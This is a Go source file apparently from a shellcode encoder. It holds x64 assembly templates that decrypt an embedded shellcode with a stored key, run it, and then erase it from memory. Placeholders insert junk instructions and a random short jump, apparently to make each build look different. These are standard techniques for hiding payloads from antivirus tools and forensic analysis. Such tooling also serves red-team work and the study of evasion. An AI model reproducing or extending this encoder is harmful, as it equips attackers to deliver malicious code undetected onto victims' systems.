package ssce

import (
	"encoding/hex"
	"fmt"
	"strings"
)

var x86asm = `
.code32

entry:
  ret
`

var x64asm = `
.code64

entry:
  // prepare the environment
  {{db .JumpShort}}                          // random jump short
  {{db .SaveContext}}                        // save GP registers
  push rbx                         {{igi}}   // store rbx for save entry address
  push rbp                         {{igi}}   // store rbp for save stack address
  mov rbp, rsp                     {{igi}}   // create new stack frame
  and rsp, 0xFFFFFFFFFFFFFFF0      {{igi}}   // ensure stack is 16 bytes aligned
  sub rsp, 0x200                   {{igi}}   // reserve stack
  fxsave [rsp]                     {{igi}}   // save FP registers

  // calculate the entry address
  {{igi}}      {{igi}}
  call calc_entry_addr
  flag_CEA:
  {{igi}}      {{igi}}

  // save arguments for test
  push rcx                         {{igi}}
  push rdx                         {{igi}}
  push r8                          {{igi}}
  push r9                          {{igi}}

  call decrypt_shellcode           {{igi}}
  
  // restore arguments for test
  pop r9                           {{igi}}
  pop r8                           {{igi}}
  pop rdx                          {{igi}}
  pop rcx                          {{igi}}

  sub rsp, 0x80                    {{igi}}   // reserve stack
  call shellcode_stub              {{igi}}   // call the shellcode
  add rsp, 0x80                    {{igi}}   // restore stack

  push rax                         {{igi}}   // save the return value
 
  // erase the shellcode
  // test rax, rax
  // jmp skip_erase
  lea rcx, [rbx + shellcode_stub]  {{igi}}
  mov rdx, {{hex .ShellcodeLen}}   {{igi}}
  sub rsp, 0x20                    {{igi}}   // reserve stack
  call eraser_stub                 {{igi}}   // call the eraser
  add rsp, 0x20                    {{igi}}   // restore stack
  skip_erase:

  pop rax                          {{igi}}   // restore the return value

  fxrstor [rsp]                    {{igi}}   // restore FP registers
  add rsp, 0x200                   {{igi}}   // reserve stack
  mov rsp, rbp                     {{igi}}   // restore stack address
  pop rbp                          {{igi}}   // restore rbp
  pop rbx                          {{igi}}   // restore rbx
  {{db .RestoreContext}}                     // restore GP registers
  ret                              {{igi}}
  
// calculate the shellcode entry address.
calc_entry_addr:
  pop rax                          {{igi}}   // get return address
  mov rbx, rax                     {{igi}}   // calculate entry address
  sub rbx, flag_CEA                {{igi}}   // fix bug for assembler
  push rax                         {{igi}}   // push return address
  ret                              {{igi}}   // return to the entry

decrypt_shellcode:
  lea rcx, [rbx + shellcode_stub]  {{igi}}
  mov rdx, {{hex .ShellcodeLen}}   {{igi}}
  lea r8, [rbx + crypto_key]       {{igi}}
  mov r9, {{hex .CryptoKeyLen}}    {{igi}}
  sub rsp, 0x40                    {{igi}}
  call decryptor_stub              {{igi}}
  add rsp, 0x40                    {{igi}}
  ret                              {{igi}}

decryptor_stub:
  {{db .DecryptorStub}}            {{igi}}

crypto_key:
  {{db .CryptoKey}}                {{igi}}

eraser_stub:
  {{db .EraserStub}}               {{igi}}

shellcode_stub:
  {{db .Shellcode}}
`

type asmContext struct {
	JumpShort      []byte
	SaveContext    []byte
	RestoreContext []byte
	DecryptorStub  []byte
	EraserStub     []byte
	CryptoKey      []byte
	CryptoKeyLen   int
	Shellcode      []byte
	ShellcodeLen   int
}

func toDB(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	builder := strings.Builder{}
	builder.WriteString(".byte ")
	for i := 0; i < len(b); i++ {
		builder.WriteString("0x")
		builder.WriteString(hex.EncodeToString([]byte{b[i]}))
		builder.WriteString(", ")
	}
	return builder.String()
}

func toHex(v int) string {
	return fmt.Sprintf("0x%X", v)
}
